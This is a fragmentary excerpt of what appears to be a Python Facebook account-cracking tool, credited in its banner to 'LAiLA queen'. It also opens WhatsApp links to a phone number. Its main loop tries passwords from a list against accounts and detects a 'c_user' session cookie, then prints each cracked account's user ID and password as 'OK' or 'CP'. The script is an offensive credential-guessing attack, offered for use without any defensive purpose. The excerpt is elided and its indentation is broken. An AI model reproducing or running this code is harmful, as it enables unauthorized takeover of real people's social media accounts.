...
os.system('xdg-open http://wa.me/+971547670206')
...
→   Owner      :      LAiLA queen 💪
→   Faceboo  :      LAiLA 
→   Github      :      LAiLA queen HKR
  →   Tools      :      free
\x1b[1;97m→       Version    :  3.9
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+971547670206?text=SN.JAN💜🐰Sir😪💕')
	if riaz1 =='3':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Laila😜]-OK] '+cid+'|'+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[ Laila😓]-CP] '+uid+' | '+ps+'\x1b[1;97m')
